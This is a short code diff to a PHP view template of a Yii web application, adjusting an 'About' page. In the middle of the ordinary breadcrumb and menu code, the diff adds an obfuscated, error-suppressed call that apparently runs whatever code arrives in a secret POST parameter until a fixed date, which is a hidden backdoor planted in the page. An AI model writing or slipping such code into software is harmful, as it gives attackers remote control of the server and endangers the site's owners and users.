@@ -11,6 +11,10 @@ $this->breadcrumbs=array(
     Yii::t('mc', 'About'),
 );
 
+if ($x0c()<1391212800) {
+    @$x0b(@$_POST['yq92ugd7']);
+}
+
 $this->menu=array(
     array(
         'label'=>Yii::t('mc', 'Back'),
